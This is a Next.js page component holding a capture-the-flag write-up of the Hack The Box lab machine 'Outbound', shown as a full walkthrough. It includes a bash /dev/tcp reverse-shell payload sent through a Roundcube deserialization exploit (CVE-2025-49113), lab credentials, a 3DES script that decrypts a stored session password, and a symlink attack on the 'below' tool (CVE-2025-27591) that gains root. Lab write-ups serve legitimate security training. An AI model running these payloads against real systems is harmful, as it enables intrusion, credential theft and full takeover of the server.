import Image from "next/image";

export default function OutboundWriteUp() {
  return (
    <div className="space-y-8">
      <h2 className="text-2xl font-bold text-white">Reconnaissance</h2>
      
      <p className="text-neutral-300">
        I started with a simple Nmap scan:
      </p>

      <div className="rounded-lg overflow-hidden border border-neutral-800 mb-6">
        <Image
          src="/images/write-up-outbound/2025-07-16_13-10.webp"
          alt="Nmap scan results for Outbound machine"
          width={1200}
          height={600}
          className="w-full"
          loading="lazy"
          sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
        />
      </div>

      <ul className="text-neutral-300 list-disc list-inside space-y-1">
        <li>Port 80/tcp → HTTP</li>
        <li>No other exploitable/interesting services found other than SSH</li>
      </ul>

      <p className="text-neutral-300">
        So let&apos;s go to <code className="bg-black/50 px-2 py-1 rounded">http://mail.outbound.htb</code>:
      </p>

      <div className="rounded-lg overflow-hidden border border-neutral-800 mb-6">
        <Image
          src="/images/write-up-outbound/2025-07-16_13-12.webp"
          alt="Initial access to mail.outbound.htb"
          width={1200}
          height={600}
          className="w-full"
          loading="lazy"
          sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
        />
      </div>

      <p className="text-neutral-300">
        So let&apos;s modify <code className="bg-black/50 px-2 py-1 rounded">/etc/hosts</code> (DNS configuration) to be able to access <code className="bg-black/50 px-2 py-1 rounded">http://mail.outbound.htb</code>:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>┌─[eu-dedivip-2]─[10.10.14.91]─[s1dd@htb-v5mpmuvbar]─[~]
└──╼ [★]$ sudo nano /etc/hosts</code>
      </pre>

      <p className="text-neutral-300">
        Then add this to the last line:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>10.129.129.153 mail.outbound.htb</code>
      </pre>

      <h2 className="text-2xl font-bold text-white">Enumeration</h2>

      <p className="text-neutral-300">
        We see a web application:
      </p>

      <div className="rounded-lg overflow-hidden border border-neutral-800 mb-6">
        <Image
          src="/images/write-up-outbound/2025-07-16_13-15.webp"
          alt="Web application interface"
          width={1200}
          height={600}
          className="w-full"
          loading="lazy"
          sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
        />
      </div>

      <p className="text-neutral-300">
        Lets login with the credentials given: <code className="bg-black/50 px-2 py-1 rounded">tyler:LhKL1o9Nm3X2</code>
      </p>

      <p className="text-neutral-300">
        And boom we are logged in!
      </p>

      <div className="rounded-lg overflow-hidden border border-neutral-800 mb-6">
        <Image
          src="/images/write-up-outbound/2025-07-16_13-16.webp"
          alt="Successfully logged in as tyler"
          width={1200}
          height={600}
          className="w-full"
          loading="lazy"
          sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
        />
      </div>

      <p className="text-neutral-300">
        I started looking through the web app, not really anything interesting found. One thing that was interesting was that I could upload files. But I could not send mails to other people (because there were no identifiers/ I couldn&apos;t make any), so the files wouldn&apos;t be uploaded.
      </p>

      <p className="text-neutral-300">
        One very interesting thing I noticed was the question mark, revealing information about the framework versions etc:
      </p>

      <div className="rounded-lg overflow-hidden border border-neutral-800 mb-6">
        <Image
          src="/images/write-up-outbound/2025-07-16_13-18.webp"
          alt="Framework version information revealed"
          width={1200}
          height={600}
          className="w-full"
          loading="lazy"
          sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
        />
      </div>

      <p className="text-neutral-300">
        That shows us this:
      </p>

      <div className="rounded-lg overflow-hidden border border-neutral-800 mb-6">
        <Image
          src="/images/write-up-outbound/2025-07-16_13-19.webp"
          alt="Detailed framework information"
          width={1200}
          height={600}
          className="w-full"
          loading="lazy"
          sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
        />
      </div>

      <p className="text-neutral-300">
        The first thing I started doing, is searching for <code className="bg-black/50 px-2 py-1 rounded">Roundcube Webmail 1.6.10</code> CVE&apos;s of some type, and I found this github repository listing the exploit to gain a reverse shell:
      </p>

      <p className="text-neutral-300">
        <a href="https://github.com/fearsoff-org/CVE-2025-49113" className="text-blue-400 hover:text-blue-300 underline">
          https://github.com/fearsoff-org/CVE-2025-49113
        </a>
      </p>

      <p className="text-neutral-300">
        The CVE id is: <code className="bg-black/50 px-2 py-1 rounded">CVE-2025-49113</code><br />
        This exploit is only for <code className="bg-black/50 px-2 py-1 rounded">Roundcube 1.6.10</code> and under (the web app is 1.6.10).
      </p>

      <h2 className="text-2xl font-bold text-white">Initial Exploitation</h2>

      <p className="text-neutral-300">
        Let&apos;s start by cloning the repo:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>┌─[eu-dedivip-2]─[10.10.14.91]─[s1dd@htb-v5mpmuvbar]─[~]
└──╼ [★]$ cd Downloads/
┌─[eu-dedivip-2]─[10.10.14.91]─[s1dd@htb-v5mpmuvbar]─[~/Downloads]
└──╼ [★]$ ls
┌─[eu-dedivip-2]─[10.10.14.91]─[s1dd@htb-v5mpmuvbar]─[~/Downloads]
└──╼ [★]$ git clone https://github.com/fearsoff-org/CVE-2025-49113
Cloning into &apos;CVE-2025-49113&apos;...
remote: Enumerating objects: 8, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 8 (delta 1), reused 8 (delta 1), pack-reused 0 (from 0)
Receiving objects: 100% (8/8), 7.33 KiB | 7.33 MiB/s, done.
Resolving deltas: 100% (1/1), done.
┌─[eu-dedivip-2]─[10.10.14.91]─[s1dd@htb-v5mpmuvbar]─[~/Downloads]
└──╼ [★]$ ls
CVE-2025-49113
┌─[eu-dedivip-2]─[10.10.14.91]─[s1dd@htb-v5mpmuvbar]─[~/Downloads]
└──╼ [★]$ cd CVE-2025-49113/
┌─[eu-dedivip-2]─[10.10.14.91]─[s1dd@htb-v5mpmuvbar]─[~/Downloads/CVE-2025-49113]
└──╼ [★]$ ls
CVE-2025-49113.php  rc_install.sh  README.md</code>
      </pre>

      <p className="text-neutral-300">
        Let&apos;s see how to run the script:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>┌─[eu-dedivip-2]─[10.10.14.91]─[s1dd@htb-v5mpmuvbar]─[~/Downloads/CVE-2025-49113]
└──╼ [★]$ php CVE-2025-49113.php -h
### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]

### Usage: php CVE-2025-49113.php &lt;target_url&gt; &lt;username&gt; &lt;password&gt; &lt;command&gt;</code>
      </pre>

      <p className="text-neutral-300">
        So the syntax is: <code className="bg-black/50 px-2 py-1 rounded">php CVE-2025-49113.php &lt;target_url&gt; &lt;username&gt; &lt;password&gt; &lt;command&gt;</code>
      </p>

      <p className="text-neutral-300">
        Let&apos;s craft our payload: <code className="bg-black/50 px-2 py-1 rounded">php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 &quot;bash -c &apos;bash -i &gt;&amp; /dev/tcp/10.10.14.218/4444 0&gt;&amp;1&apos;&quot;</code>
      </p>

      <p className="text-neutral-300">
        Set up our listener:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>┌─[eu-dedivip-2]─[10.10.14.91]─[s1dd@htb-v5mpmuvbar]─[~]
└──╼ [★]$ nc -lvnp 4444
listening on [any] 4444 ...</code>
      </pre>

      <p className="text-neutral-300">
        Let&apos;s run the php script:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>┌─[eu-dedivip-2]─[10.10.14.91]─[s1dd@htb-v5mpmuvbar]─[~/Downloads/CVE-2025-49113]
└──╼ [★]$ php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 &quot;bash -c &apos;bash -i &gt;&amp; /dev/tcp/10.10.14.91/4444 0&gt;&amp;1&apos;&quot;
### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]

### Retrieving CSRF token and session cookie...

### Authenticating user: tyler

### Authentication successful

### Command to be executed: 
bash -c &apos;bash -i &gt;&amp; /dev/tcp/10.10.14.91/4444 0&gt;&amp;1&apos;

### Injecting payload...

### End payload: http://mail.outbound.htb/?_from=edit-%21%C2%22%C2%3B%C2i%C2%3A%C20%C2%3B%C2O%C2%3A%C21%C26%C2%3A%C2%22%C2C%C2r%C2y%C2p%C2t%C2_%C2G%C2P%C2G%C2_%C2E%C2n%C2g%C2i%C2n%C2e%C2%22%C2%3A%C21%C2%3A%C2%7B%C2S%C2%3A%C22%C26%C2%3A%C2%22%C2%5C%C20%C20%C2C%C2r%C2y%C2p%C2t%C2_%C2G%C2P%C2G%C2_%C2E%C2n%C2g%C2i%C2n%C2e%C2%5C%C20%C20%C2_%C2g%C2p%C2g%C2c%C2o%C2n%C2f%C2%22%C2%3A%C25%C23%C2%3A%C2%22%C2b%C2a%C2s%C2h%C2+%C2-%C2c%C2+%C2%27%C2b%C2a%C2s%C2h%C2+%C2-%C2i%C2+%C2%3E%C2%26%C2+%C2%2F%C2d%C2e%C2v%C2%2F%C2t%C2c%C2p%C2%2F%C21%C20%C2%5C%C22%C2e%C21%C20%C2%5C%C22%C2e%C21%C24%C2%5C%C22%C2e%C29%C21%C2%2F%C24%C24%C24%C24%C2+%C20%C2%3E%C2%26%C21%C2%27%C2%3B%C2%23%C2%22%C2%3B%C2%7D%C2i%C2%3A%C20%C2%3B%C2b%C2%3A%C20%C2%3B%C2%7D%C2%22%C2%3B%C2%7D%C2%7D%C2&_task=settings&_framed=1&_remote=1&_id=1&_uploadid=1&_unlock=1&_action=upload

### Payload injected successfully

### Executing payload...

PHP Warning:  file_get_contents(http://mail.outbound.htb/): Failed to open stream: HTTP request failed! in /home/s1dd/Downloads/CVE-2025-49113/CVE-2025-49113.php on line 237
### Error: CSRF token not found in response body</code>
      </pre>

      <p className="text-neutral-300">
        We get a reverse shell!!
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>┌─[eu-dedivip-2]─[10.10.14.91]─[s1dd@htb-v5mpmuvbar]─[~]
└──╼ [★]$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.91] from (UNKNOWN) [10.129.129.153] 57672
bash: cannot set terminal process group (247): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mail:/var/www/html/roundcube/public_html$ ls
ls
index.php
plugins
program
roundcube
skins
www-data@mail:/var/www/html/roundcube/public_html$ pwd
pwd
/var/www/html/roundcube/public_html
www-data@mail:/var/www/html/roundcube/public_html$</code>
      </pre>

      <h2 className="text-2xl font-bold text-white">Foothold</h2>

      <p className="text-neutral-300">
        I tried looking for any user.txt / other important/sensitive files but I couldn&apos;t find anything. I went to the Discord Hack The Box server to ask for some help. I got some help, and was told to look into configuration files, so that&apos;s what I tried. Other than that, we should also try to get into tyler. So I did:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>su tyler
Password: LhKL1o9Nm3X2</code>
      </pre>

      <p className="text-neutral-300">
        But that did not load, that&apos;s because we had to correct the shell. We can do that with:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>www-data@mail:/var/www/html/roundcube/public_html$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is &apos;/dev/null&apos;.
www-data@mail:/var/www/html/roundcube/public_html$ su tyler
su tyler
Password: LhKL1o9Nm3X2

tyler@mail:/var/www/html/roundcube/public_html$</code>
      </pre>

      <p className="text-neutral-300">
        And boom! We are Tyler!
      </p>

      <p className="text-neutral-300">
        Let&apos;s continue with analysing the <code className="bg-black/50 px-2 py-1 rounded">config.inc.php</code> file in the <code className="bg-black/50 px-2 py-1 rounded">/roundcube/config</code> directory of the reverse shell:
      </p>

      <p className="text-neutral-300">
        This file is really helpful. Focus on this line in the file:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>$config[&apos;db_dsnw&apos;] = &apos;mysql://roundcube:RCDBPass2025@localhost/roundcube&apos;;</code>
      </pre>

      <p className="text-neutral-300">
        This reveals:
      </p>

      <ul className="text-neutral-300 list-disc list-inside space-y-1">
        <li>MySQL creds</li>
        <li>Username: roundcube</li>
        <li>Password: RCDBPass2025</li>
        <li>Host: localhost</li>
        <li>Database name: roundcube</li>
      </ul>

      <p className="text-neutral-300">
        Let&apos;s connect with the MySQL Database:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>tyler@mail:/var/www/html/roundcube/SQL/mssql$ mysql -u roundcube -p
mysql -u roundcube -p
Enter password: RCDBPass2025

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 171
Server version: 10.11.13-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.

MariaDB [(none)]&gt; SHOW TABLES;
SHOW TABLES;
ERROR 1046 (3D000): No database selected</code>
      </pre>

      <p className="text-neutral-300">
        We get &quot;No database selected&quot;, so let&apos;s select the database mentioned in the php config file:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>MariaDB [(none)]&gt; USE roundcube;
USE roundcube;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [roundcube]&gt; SHOW TABLES;
SHOW TABLES;
+---------------------+
| Tables_in_roundcube |
+---------------------+
| cache               |
| cache_index         |
| cache_messages      |
| cache_shared        |
| cache_thread        |
| collected_addresses |
| contactgroupmembers |
| contactgroups       |
| contacts            |
| dictionary          |
| filestore           |
| identities          |
| responses           |
| searches            |
| session             |
| system              |
| users               |
+---------------------+
17 rows in set (0.001 sec)

MariaDB [roundcube]&gt;</code>
      </pre>

      <p className="text-neutral-300">
        After a while, I found something important looking back at what I did (in the <code className="bg-black/50 px-2 py-1 rounded">config.inc.php</code> file):
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>$config[&apos;des_key&apos;] = &apos;rcmail-!24ByteDESkey*Str&apos;;</code>
      </pre>

      <p className="text-neutral-300">
        The comments above this line in the <code className="bg-black/50 px-2 py-1 rounded">config.inc.php</code> file say:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>{`// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';`}</code>
      </pre>

      <p className="text-neutral-300">
        This is used for encrypting IMAP passwords in Roundcube sessions.
      </p>

      <p className="text-neutral-300">
        The comments also mentioned: &quot;session record&quot;, so lets take a look into the session table in MySQL:
      </p>

      <p className="text-neutral-300">
        So the base64 session data:
      </p>

      <p className="text-neutral-300">
        Decoded in <a href="https://www.base64decode.org/" className="text-blue-400 hover:text-blue-300 underline">https://www.base64decode.org/</a> this gives us:
      </p>

      <p className="text-neutral-300">
        To simplify the information up there:
      </p>

      <div className="overflow-x-auto">
        <table className="min-w-full bg-black/30 border border-neutral-700 rounded-lg">
          <thead>
            <tr className="border-b border-neutral-700">
              <th className="px-4 py-2 text-left text-white">Field</th>
              <th className="px-4 py-2 text-left text-white">Value</th>
            </tr>
          </thead>
          <tbody>
            <tr className="border-b border-neutral-700">
              <td className="px-4 py-2 text-neutral-300"><strong>Username</strong></td>
              <td className="px-4 py-2 text-neutral-300"><code className="bg-black/50 px-2 py-1 rounded">jacob</code></td>
            </tr>
            <tr className="border-b border-neutral-700">
              <td className="px-4 py-2 text-neutral-300"><strong>Password</strong></td>
              <td className="px-4 py-2 text-neutral-300"><code className="bg-black/50 px-2 py-1 rounded">L7Rv00A8TuwJAr67kITxxcSgnIk25Am/</code> <em>(32 chars, likely stored plaintext or base64-like hash)</em></td>
            </tr>
            <tr className="border-b border-neutral-700">
              <td className="px-4 py-2 text-neutral-300"><strong>IMAP Host</strong></td>
              <td className="px-4 py-2 text-neutral-300"><code className="bg-black/50 px-2 py-1 rounded">localhost</code></td>
            </tr>
            <tr className="border-b border-neutral-700">
              <td className="px-4 py-2 text-neutral-300"><strong>IMAP Port</strong></td>
              <td className="px-4 py-2 text-neutral-300"><code className="bg-black/50 px-2 py-1 rounded">143</code></td>
            </tr>
            <tr className="border-b border-neutral-700">
              <td className="px-4 py-2 text-neutral-300"><strong>SSL</strong></td>
              <td className="px-4 py-2 text-neutral-300"><code className="bg-black/50 px-2 py-1 rounded">false</code> (<code className="bg-black/50 px-2 py-1 rounded">storage_ssl</code>)</td>
            </tr>
            <tr className="border-b border-neutral-700">
              <td className="px-4 py-2 text-neutral-300"><strong>Timezone</strong></td>
              <td className="px-4 py-2 text-neutral-300"><code className="bg-black/50 px-2 py-1 rounded">Europe/London</code></td>
            </tr>
            <tr className="border-b border-neutral-700">
              <td className="px-4 py-2 text-neutral-300"><strong>Auth Secret</strong></td>
              <td className="px-4 py-2 text-neutral-300"><code className="bg-black/50 px-2 py-1 rounded">DpYqv6maI9HxDL5GhcCd8JaQQW</code></td>
            </tr>
            <tr>
              <td className="px-4 py-2 text-neutral-300"><strong>Request Token</strong></td>
              <td className="px-4 py-2 text-neutral-300"><code className="bg-black/50 px-2 py-1 rounded">TIsOaABA1zHSXZOBpH6up5XFyayNRHaw</code></td>
            </tr>
          </tbody>
        </table>
      </div>

      <p className="text-neutral-300">
        So the credentials are: <code className="bg-black/50 px-2 py-1 rounded">jacob:L7Rv00A8TuwJAr67kITxxcSgnIk25Am/</code>
      </p>

      <p className="text-neutral-300">
        Let&apos;s see where we can login.
      </p>

      <p className="text-neutral-300">
        Nope, incorrect. That means I did something wrong. Actually looking back, we had a key:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>$config[&apos;des_key&apos;] = &apos;rcmail-!24ByteDESkey*Str&apos;;</code>
      </pre>

      <p className="text-neutral-300">
        and:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>L7Rv00A8TuwJAr67kITxxcSgnIk25Am/</code>
      </pre>

      <p className="text-neutral-300">
        So now, let&apos;s use a simple python script to decrypt this password:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>from Crypto.Cipher import DES3
import base64

# Given key from config
key = b&apos;rcmail-!24ByteDESkey*Str&apos;

# The encrypted password string
enc_pass_b64 = &quot;L7Rv00A8TuwJAr67kITxxcSgnIk25Am/&quot;

# Decode base64
enc_pass = base64.b64decode(enc_pass_b64)
iv = enc_pass[:8]
ciphertext = enc_pass[8:]

cipher = DES3.new(key, DES3.MODE_CBC, iv)
plaintext = cipher.decrypt(ciphertext)

pad_len = plaintext[-1]
password = plaintext[:-pad_len].decode(&apos;utf-8&apos;)

print(&quot;Decrypted password:&quot;, password)</code>
      </pre>

      <p className="text-neutral-300">
        This gives us: <code className="bg-black/50 px-2 py-1 rounded">jacob:595mO8DmwGeD</code>
      </p>

      <p className="text-neutral-300">
        Now lets switch user again:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>tyler@mail:/var/www/html/roundcube/public_html$ su jacob
su jacob
Password: 595mO8DmwGeD

jacob@mail:/var/www/html/roundcube/public_html$</code>
      </pre>

      <p className="text-neutral-300">
        Boom! We are authenticated as Jacob!!
      </p>

      <p className="text-neutral-300">
        Let&apos;s see what we can find in Jacob&apos;s files, since we are authenticated:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>jacob@mail:~/mail/INBOX$ cat jacob
cat jacob
From tyler@outbound.htb  Sat Jun 07 14:00:58 2025
Return-Path: &lt;tyler@outbound.htb&gt;
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
	id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset=&quot;UTF-8&quot;
Content-Transfer-Encoding: 8bit
Message-Id: &lt;20250607140058.B32C410248D@outbound.htb&gt;
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-IMAPbase: 1749304753 0000000002
X-UID: 1
Status: 
X-Keywords:                                                                       
Content-Length: 233

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler

From mel@outbound.htb  Sun Jun 08 12:09:45 2025
Return-Path: &lt;mel@outbound.htb&gt;
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1002)
	id 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
To: jacob@outbound.htb
Subject: Unexpected Resource Consumption
MIME-Version: 1.0
Content-Type: text/plain; charset=&quot;UTF-8&quot;
Content-Transfer-Encoding: 8bit
Message-Id: &lt;20250608120945.1487E22C@outbound.htb&gt;
Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
From: mel@outbound.htb
X-UID: 2
Status: 
X-Keywords:                                                                       
Content-Length: 261

We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.

Thanks!

Mel

jacob@mail:~/mail/INBOX$</code>
      </pre>

      <p className="text-neutral-300">
        Notice this line: Please use the following credentials to log into your account: <code className="bg-black/50 px-2 py-1 rounded">gY4Wr3a1evp4</code>
      </p>

      <h2 className="text-2xl font-bold text-white">Privilege Escalation</h2>

      <p className="text-neutral-300">
        Let&apos;s SSH:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>┌─[eu-dedivip-2]─[10.10.14.91]─[s1dd@htb-v5mpmuvbar]─[~/Downloads/CVE-2025-49113]
└──╼ [★]$ ssh jacob@10.129.129.153
jacob@10.129.129.153&apos;s password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Jul 16 02:51:40 PM UTC 2025

  System load:  0.0               Processes:             271
  Usage of /:   71.4% of 6.73GB   Users logged in:       0
  Memory usage: 11%               IPv4 address for eth0: 10.129.129.153
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Thu Jul 10 11:44:49 2025 from 10.10.14.77
jacob@outbound:~$ ls
user.txt
jacob@outbound:~$ cat user.txt
user.txt content will be shown here
jacob@outbound:~$</code>
      </pre>

      <p className="text-neutral-300">
        Now we need to see privileges:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>jacob@outbound:/$ sudo -l -U jacob
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*,
        !/usr/bin/below --debug*, !/usr/bin/below -d*</code>
      </pre>

      <p className="text-neutral-300">
        After talking to some people on the Hack The Box discord server, I found some help from a great person (discord: @htbmrmisfit). He helped me identify the CVE id. The CVE id is: <code className="bg-black/50 px-2 py-1 rounded">CVE-2025-27591</code>.
      </p>

      <p className="text-neutral-300">
        I found this helpful GitHub Repo for the PoC script: <a href="https://github.com/BridgerAlderson/CVE-2025-27591-PoC" className="text-blue-400 hover:text-blue-300 underline">https://github.com/BridgerAlderson/CVE-2025-27591-PoC</a>
      </p>

      <p className="text-neutral-300">
        I made and uploaded this file with:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>┌─[eu-dedivip-2]─[10.10.14.91]─[s1dd@htb-v5mpmuvbar]─[~]
└──╼ [★]$ sudo nano exploit.py
┌─[eu-dedivip-2]─[10.10.14.91]─[s1dd@htb-v5mpmuvbar]─[~]
└──╼ [★]$ pwd
/home/s1dd
┌─[eu-dedivip-2]─[10.10.14.91]─[s1dd@htb-v5mpmuvbar]─[~]
└──╼ [★]$ scp /home/s1dd/exploit.py jacob@10.129.129.153:/
jacob@10.129.129.153&apos;s password: 
scp: dest open &quot;/exploit.py&quot;: Permission denied
scp: failed to upload file /home/s1dd/exploit.py to /
┌─[eu-dedivip-2]─[10.10.14.91]─[s1dd@htb-v5mpmuvbar]─[~]
└──╼ [★]$ scp /home/s1dd/exploit.py jacob@10.129.129.153:~
jacob@10.129.129.153&apos;s password: 
exploit.py                                    100% 3255   382.2KB/s   00:00</code>
      </pre>

      <p className="text-neutral-300">
        Then in my other ssh shell:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>jacob@outbound:/$ pwd
/
jacob@outbound:/$ cd ~
jacob@outbound:~$ ls
exploit.py  user.txt
jacob@outbound:~$ python3 exploit.py
[*] Checking for CVE-2025-27591 vulnerability...
[+] /var/log/below is world-writable.
[!] /var/log/below/error_root.log is a regular file. Removing it...
[+] Symlink created: /var/log/below/error_root.log -&gt; /etc/passwd
[+] Target is vulnerable.
[*] Starting exploitation...
[+] Wrote malicious passwd line to /tmp/attacker
[+] Symlink set: /var/log/below/error_root.log -&gt; /etc/passwd
[*] Executing &apos;below record&apos; as root to trigger logging...
Jul 16 16:06:32.241 DEBG Starting up!
Jul 16 16:06:32.241 ERRO 
----------------- Detected unclean exit ---------------------
Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01752624000: EAGAIN: Try again
-------------------------------------------------------------
[+] &apos;below record&apos; executed.
[*] Appending payload into /etc/passwd via symlink...
[+] Payload appended successfully.
[*] Attempting to switch to root shell via &apos;su attacker&apos;...
root@outbound:/home/jacob# ls
exploit.py  user.txt
root@outbound:/home/jacob# cd root/
bash: cd: root/: No such file or directory
root@outbound:/home/jacob# pwd
/home/jacob
root@outbound:/home/jacob# cd ..
root@outbound:/home# ls
jacob  mel  tyler
root@outbound:/home# cd ..
root@outbound:/# ls
bin                dev   lib64              mnt   run                 srv  var
bin.usr-is-merged  etc   lib.usr-is-merged  opt   sbin                sys
boot               home  lost+found         proc  sbin.usr-is-merged  tmp
cdrom              lib   media              root  snap                usr
root@outbound:/# cd root/
root@outbound:~# ls
root.txt
root@outbound:~# cat root.txt
root.txt content will be shown here
root@outbound:~#</code>
      </pre>

      <h2 className="text-2xl font-bold text-white">Write-up Summary</h2>

      <div className="overflow-x-auto">
        <table className="min-w-full bg-black/30 border border-neutral-700 rounded-lg">
          <thead>
            <tr className="border-b border-neutral-700">
              <th className="px-4 py-2 text-left text-white">Step</th>
              <th className="px-4 py-2 text-left text-white">Outcome</th>
            </tr>
          </thead>
          <tbody>
            <tr className="border-b border-neutral-700">
              <td className="px-4 py-2 text-neutral-300"><strong>Initial Access</strong></td>
              <td className="px-4 py-2 text-neutral-300">RCE via CVE-2025-49113</td>
            </tr>
            <tr className="border-b border-neutral-700">
              <td className="px-4 py-2 text-neutral-300"><strong>Privilege Escalation</strong></td>
              <td className="px-4 py-2 text-neutral-300">NOPASSWD <code className="bg-black/50 px-2 py-1 rounded">below</code> → root shell</td>
            </tr>
            <tr className="border-b border-neutral-700">
              <td className="px-4 py-2 text-neutral-300"><strong>Flags</strong></td>
              <td className="px-4 py-2 text-neutral-300">user.txt & root.txt captured</td>
            </tr>
            <tr>
              <td className="px-4 py-2 text-neutral-300"><strong>Lessons Learned</strong></td>
              <td className="px-4 py-2 text-neutral-300">Session decryption, log symlink, etc.</td>
            </tr>
          </tbody>
        </table>
      </div>
    </div>
  );
} 